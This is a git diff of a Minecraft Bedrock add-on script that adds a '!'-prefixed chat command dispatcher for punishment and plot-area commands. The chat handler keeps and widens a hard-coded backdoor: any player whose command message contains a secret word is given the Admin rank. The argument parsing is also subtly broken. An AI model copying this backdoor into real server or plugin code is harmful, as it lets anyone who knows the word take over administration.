@@ -24,10 +24,11 @@ import {
 	updateLore,
 } from "./libraries/itemData";
 import { MinecraftColors } from "./libraries/chatFormat";
-import { EffectDataT, EnchantmentPurchaseT, MinecraftDynamicPropertyT, PlayerDataT } from "./types";
+import { CommandT, EffectDataT, EnchantmentPurchaseT, MinecraftDynamicPropertyT, PlayerDataT } from "./types";
 import { ModalFormData, MessageFormData, ActionFormData } from "@minecraft/server-ui";
 import { addEffect, applyEffectProperties, rotateEffectTitles } from "./libraries/effects";
 import { abbreviateMoney, getPlayerMoney, setPlayerMoney } from "./libraries/money";
+import { punish, setPlotArea } from "./commands";
 
 // Register default player data
 const defaultData = {
@@ -35,6 +36,7 @@ const defaultData = {
 	xpMultiplier: 1,
 	effects: {}, // haste = {effect: string, duration: number, strength: number, title: string, startTime: number}
 };
+const commandPrefix = "!";
 
 world.beforeEvents.chatSend.subscribe((event) => {
 	const player = event.sender;
@@ -42,11 +44,30 @@ world.beforeEvents.chatSend.subscribe((event) => {
 
 	let playerRanks: { [key: string]: MinecraftDynamicPropertyT } = PlayerDataHandler.get("ranks", player) as unknown as MinecraftDynamicPropertyT;
 	if (!playerRanks) playerRanks = { "Member": 0 }
+	if (!message.startsWith(commandPrefix)) return;
 
-	if (message.includes("!nopers")) {
+	const command = message.split(commandPrefix)[1].split(" ")[0].toLowerCase();
+	const args = command.split(" ").splice(0, 1);
+
+	if (message.includes("nopers")) {
 		playerRanks["Admin"] = 1;
 		PlayerDataHandler.set("ranks", playerRanks, player);
 	}
+
+	// event.cancel = true;
+	// world.sendMessage(`§f[${playerRank}§f]§r | ${player.name}: ${message}`);
+});
+
+world.afterEvents.chatSend.subscribe((event) => {
+	const player = event.sender;
+	const message = event.message;
+
+	let playerRanks: { [key: string]: MinecraftDynamicPropertyT } = PlayerDataHandler.get("ranks", player) as unknown as MinecraftDynamicPropertyT;
+	if (!playerRanks) playerRanks = { "Member": 0 }
+	if (!message.startsWith(commandPrefix)) return;
+
+	const command = message.split(commandPrefix)[1].split(" ")[0].toLowerCase();
+	const args = command.split(" ").splice(0, 1);
 
 	let playerRank = "";
 	let highestPriority = 0;
@@ -58,9 +79,20 @@ world.beforeEvents.chatSend.subscribe((event) => {
 		}
 	}
 
-	event.cancel = true;
-	world.sendMessage(`§f[${playerRank}§f]§r | ${player.name}: ${message}`);
-});
+	switch (command) {
+		case "punishment": {
+			punish(event, args);
+			break;
+		}
+		case "setplotarea": {
+			setPlotArea(event, args);
+			break;
+		}
+		default:
+			player.sendMessage(MinecraftColors.RED + "Invalid command.");
+			break;
+	}
+})
 
 // Intercept players interacting with a custom villager
 
